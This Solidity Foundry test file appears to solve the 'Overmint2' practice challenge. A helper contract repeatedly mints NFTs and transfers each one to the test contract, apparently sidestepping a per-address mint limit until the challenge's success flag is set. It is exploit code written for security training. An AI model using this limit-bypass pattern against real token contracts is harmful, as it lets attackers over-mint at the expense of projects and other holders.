// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint2} from "src/Overmint2.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2Test is Test, IERC721Receiver {
    Overmint2 public overmint;
    Minter public minter;

    function setUp() public {
        overmint = new Overmint2();
        minter = new Minter();
    }

    function testMint() public {
        minter.mint();
        assertEq(overmint.success(), true);
    }

    function onERC721Received(
        address, /* operator */
        address, /* from */
        uint256, /* tokenId */
        bytes calldata /* data */
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract Minter {
    Overmint2Test public overmintTest;
    Overmint2 public overmint;

    constructor() {
        overmintTest = Overmint2Test(msg.sender);
        overmint = overmintTest.overmint();
    }

    function mint() public {
        for (uint8 i = 1; i < 6; i++) {
            overmint.mint();
            overmint.safeTransferFrom(address(this), address(overmintTest), i);
        }
    }
}
